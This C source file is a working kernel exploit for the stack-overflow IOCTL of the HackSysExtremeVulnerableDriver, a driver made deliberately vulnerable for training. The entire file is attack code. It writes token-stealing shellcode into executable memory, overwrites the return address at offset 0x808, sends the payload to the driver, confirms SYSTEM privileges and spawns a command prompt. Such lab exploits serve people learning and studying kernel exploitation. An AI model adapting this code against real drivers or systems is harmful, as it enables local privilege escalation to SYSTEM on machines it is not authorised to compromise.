#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>

#include "../hevd.h"

#define DRIVER_PATH "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_HEVD_STACK_OVERFLOW 0x222003



BOOL HevdIoControl()
{
        HANDLE hDevice = INVALID_HANDLE_VALUE;
        BOOL bResult = FALSE;
        DWORD junk = 0;
        LPVOID lpInBuffer;
        DWORD nInBufferSize;
        LPVOID lpOutBuffer = NULL;
        DWORD nOutBufferSize;
        DWORD lpBytesReturned = 0;

        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_HEVD_STACK_OVERFLOW);

        hDevice = CreateFileA(DRIVER_PATH,
                              GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }

        ok("Got device %#lx\n", hDevice);

        info("Preparing payload\n");
        lpInBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!lpInBuffer){
                perr("VirtualAlloc failed");
                goto closedev_loc;
        }

        uint64_t offset = 0x808;
        ok("Payload allocated -> %p\n", lpInBuffer);
        ZeroMemory(lpInBuffer, 0x1000);
        CopyMemory(lpInBuffer, (LPVOID)StealTokenShellcode, StealTokenShellcodeLength);
        RtlFillMemory((uint8_t*)lpInBuffer+StealTokenShellcodeLength, offset-StealTokenShellcodeLength, '\xcc');
        ok("Shellcode copied to %p\n", lpInBuffer);

        uint64_t *ptr = (uint64_t*) (uint8_t*)(lpInBuffer + offset);
        info("Overwriting at %p\n", ptr);
        *ptr = (uint64_t)lpInBuffer;
        nInBufferSize = offset + 8;

        info("Sending payload...\n");
        bResult = DeviceIoControl(hDevice,
                                  IOCTL_HEVD_STACK_OVERFLOW,
                                  lpInBuffer,
                                  nInBufferSize,
                                  NULL,
                                  0,
                                  &lpBytesReturned,
                                  (LPOVERLAPPED) NULL);
        if (bResult==FALSE){
                perr("DeviceIoControl failed");
        }

closedev_loc:
        info("Closing device %#lx\n", hDevice);
        CloseHandle(hDevice);

        return bResult;
}


int main(int argc, char** argv, char** envp)
{
        info("Starting exploit for StackOverflow...\n");

        if (HevdIoControl()==TRUE){
                info("Checking if %s is SYSTEM\n", argv[0]);
                if (CheckIsSystem()==TRUE){
                        ok("Success\n");
                        PopupCmd();
                } else {
                        warn("Not SYSTEM\n");
                }
        }
        return 0;
}
